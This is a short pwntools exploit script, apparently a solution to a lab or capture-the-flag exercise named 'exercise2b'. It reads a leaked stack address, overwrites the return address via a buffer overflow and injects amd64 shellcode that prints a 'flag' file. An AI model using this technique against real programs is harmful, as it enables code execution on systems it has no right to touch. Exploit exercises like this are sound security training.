#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
from pwnlib.shellcraft.amd64.linux import cat
from pwnlib.asm import asm
import binascii

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise2b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

# Might need to find a way to remove the hardcoded 24
def compute_return_addr(addr):
	addr_i = int(addr[:-1], 16)
	addr_i += 24
	
	addr_b = addr_i.to_bytes(8, byteorder='little')
	
	return addr_b

# Might need to find a way to remove the hardcoded 16
def create_msg(addr):
	ret_addr = compute_return_addr(addr)
	assembly_code = asm(cat("flag"))
	msg = b'\x00' * 16 + ret_addr + assembly_code
	
	return msg
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

addr = r.recvline()
msg = create_msg(addr)

r.recvline()
r.sendline(msg)
out = r.recvall()
print(out)

